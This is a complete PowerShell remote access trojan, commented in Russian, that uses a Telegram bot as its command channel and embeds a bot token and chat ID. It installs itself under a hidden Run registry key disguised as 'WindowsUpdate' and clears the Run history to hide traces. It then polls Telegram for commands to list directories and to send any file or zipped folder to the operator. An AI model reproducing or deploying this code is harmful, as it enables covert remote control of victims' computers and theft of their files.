# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Функция отправки сообщения в Telegram
function Send-TelegramMessage {
    param($Text)
    $URL = "https://api.telegram.org/bot$Token/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text = $Text
        parse_mode = "HTML"
    }
    try {
        Invoke-RestMethod -Uri $URL -Method Post -Body $Body -UseBasicParsing | Out-Null
    } catch {}
}

# Функция отправки файла
function Send-TelegramFile {
    param($FilePath)
    $URL = "https://api.telegram.org/bot$Token/sendDocument"
    $Form = @{
        chat_id = $ChatID
        document = Get-Item -Path $FilePath
    }
    try {
        Invoke-RestMethod -Uri $URL -Method Post -Form $Form -UseBasicParsing | Out-Null
    } catch {}
}

# Создание скрытого запуска через реестр
function Install-Persistence {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $ScriptPath = "$env:TEMP\WindowsUpdate.ps1"
    Set-Content -Path $ScriptPath -Value ($MyInvocation.MyCommand.ScriptContents)
    
    # Очистка только истории RUN
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
    
    New-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`"" -Force | Out-Null
}

# Основной обработчик команд
function Start-RAT {
    $Offset = 0
    $CurrentPath = $env:USERPROFILE
    
    while ($true) {
        try {
            $Updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$Offset&timeout=60" -UseBasicParsing
            foreach ($Update in $Updates.result) {
                $Offset = $Update.update_id + 1
                $Message = $Update.message
                if ($Message -and $Message.chat.id -eq $ChatID) {
                    $Text = $Message.text
                    
                    switch -regex ($Text) {
                        "^/help$" {
                            $HelpText = @"
Доступные команды:
/ls [path] - список файлов
/cd [path] - сменить директорию  
/download [file/folder] - скачать файл/папку
/destroy - самоуничтожение
"@
                            Send-TelegramMessage -Text $HelpText
                        }
                        
                        "^/ls" {
                            $Path = $Text -replace "^/ls\s*",""
                            if (!$Path) { $Path = $CurrentPath }
                            try {
                                $Items = Get-ChildItem -Path $Path -Force | Select-Object Name,@{Name="Type";Expression={if($_.PSIsContainer){"Directory"}else{"File"}}},Length,LastWriteTime
                                $Output = "Содержимое $Path`n" + ($Items | Format-Table -AutoSize | Out-String)
                                Send-TelegramMessage -Text $Output
                            } catch {
                                Send-TelegramMessage -Text "Ошибка доступа к пути: $Path"
                            }
                        }
                        
                        "^/cd" {
                            $NewPath = $Text -replace "^/cd\s*",""
                            if (Test-Path $NewPath -PathType Container) {
                                $CurrentPath = $NewPath
                                Send-TelegramMessage -Text "Текущая директория: $CurrentPath"
                            } else {
                                Send-TelegramMessage -Text "Директория не найдена: $NewPath"
                            }
                        }
                        
                        "^/download" {
                            $Target = $Text -replace "^/download\s*",""
                            if (!$Target) { $Target = $CurrentPath }
                            
                            if (Test-Path $Target -PathType Container) {
                                # Архивируем папку
                                $ZipPath = "$env:TEMP\temp_$(Get-Random).zip"
                                Add-Type -Assembly System.IO.Compression.FileSystem
                                [IO.Compression.ZipFile]::CreateFromDirectory($Target, $ZipPath)
                                Send-TelegramFile -FilePath $ZipPath
                                Remove-Item $ZipPath -Force
                            } elseif (Test-Path $Target -PathType Leaf) {
                                Send-TelegramFile -FilePath $Target
                            } else {
                                Send-TelegramMessage -Text "Файл/папка не найдены: $Target"
                            }
                        }
                        
                        "^/destroy$" {
                            Send-TelegramMessage -Text "Начинаю самоуничтожение..."
                            # Удаление из автозагрузки
                            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue
                            # Удаление скрипта
                            Remove-Item -Path "$env:TEMP\WindowsUpdate.ps1" -Force -ErrorAction SilentlyContinue
                            # Завершение процесса
                            Stop-Process -Id $PID
                        }
                    }
                }
            }
        } catch {
            Start-Sleep -Seconds 10
        }
    }
}

# Установка персистентности и запуск
Install-Persistence
Start-RAT
